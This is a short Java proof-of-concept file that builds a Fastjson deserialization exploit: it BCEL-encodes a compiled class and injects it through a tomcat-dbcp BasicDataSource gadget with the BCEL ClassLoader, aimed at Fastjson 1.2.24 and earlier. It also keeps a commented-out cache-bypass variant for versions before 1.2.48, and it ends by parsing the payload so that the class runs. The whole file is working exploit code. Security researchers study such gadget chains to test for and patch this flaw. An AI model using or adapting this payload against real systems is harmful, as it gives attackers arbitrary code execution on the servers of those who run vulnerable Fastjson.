package test;
import java.io.FileInputStream;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.alibaba.fastjson.JSON;

public class Fastjson3_Becl {
	public static void main(String[] args) throws Exception {
        //<=1.2.24 and tomcat-dbcp
		FileInputStream inputFromFile = new FileInputStream("D:\\Downloads\\workspace\\fastjson\\bin\\payload\\Calc.class");
		byte[] bs = new byte[inputFromFile.available()];
		inputFromFile.read(bs);
		String code = "$$BCEL$$"+Utility.encode(bs,true);
        String payload = "{\r\n"
        		+ "    {\r\n"
        		+ "    \"aaa\": {\r\n"
        		+ "            \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\", \r\n"
        		+ "            \"driverClassLoader\": {\r\n"
        		+ "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\r\n"
        		+ "            }, \r\n"
        		+ "            \"driverClassName\": \""+code+"\"\r\n"
        		+ "        }\r\n"
        		+ "    }:\"bbb\"\r\n"
        		+ "}";
        //<1.2.48
//		  payload = "{\r\n"
//		  		+ "    {\r\n"
//		  		+ "        \"a\": {\r\n"
//		  		+ "            \"@type\": \"java.lang.Class\",\r\n"
//		  		+ "            \"val\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"\r\n"
//		  		+ "        },\r\n"
//		  		+ "        \"b\": {\r\n"
//		  		+ "            \"@type\": \"java.lang.Class\",\r\n"
//		  		+ "            \"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\r\n"
//		  		+ "        },\r\n"
//		  		+ "        \"c\": {\r\n"
//		  		+ "            \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\r\n"
//		  		+ "            \"driverClassLoader\": {\r\n"
//		  		+ "                \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\r\n"
//		  		+ "            },\r\n"
//		  		+ "            \"driverClassName\": \""+code+"\"\r\n"
//		  		+ "        }\r\n"
//		  		+ "    }:\"bbb\"\r\n"
//		  		+ "}";
        System.out.println(payload);
        JSON.parseObject(payload);	
        //new ClassLoader().loadClass(code).newInstance();
    }

}
